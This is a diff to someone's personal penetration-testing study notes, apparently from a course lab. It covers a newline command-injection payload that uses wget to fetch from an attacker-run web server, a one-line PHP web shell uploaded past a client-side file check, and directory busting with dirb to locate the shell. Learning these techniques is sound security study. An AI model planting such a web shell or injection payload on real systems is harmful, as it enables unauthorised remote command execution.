@@ -755,3 +755,26 @@ how it works:
 `python3 -m http.server 8080` -->  setup a web server from the attacker
 `https://google.com \n wget 172.17.0.1:8080/test`  -->  try to trigger a new line and retrieve 
                                                    something from the webserver
+
+### Insecure file upload
+#### Bypass files check (that is only client side)
+[[Notes_ETH#Basic Bypass 0x01]]
+
+##### Send a PHP shell
+`<?php system($_GET['cmd']); ?>`
+`$_GET` -->  this is going to get the value of the parameter inside the `[]` and send a GET request
+`system()` -->  function that executes what it has inside
+
+also:
+we need to change the file type of our new req:
+`cmd.php` -->  bc the file that we want to upload must be executable
+![[Pasted image 20240309104930.png]]
+
+###### Find the PHP Shell location
+<span style="background:#fff88f">we need to find where this file is been uploaded</span>
+=>
+we can do:
+-  <span style="color:#00b050">guessing</span>
+   you can inspect the code to see where the other img in the webserver are stored
+-  <span style="color:#00b050">directory busting</span> (ex [[cheet#dirb]])
+   `dirb  http://localhost/`
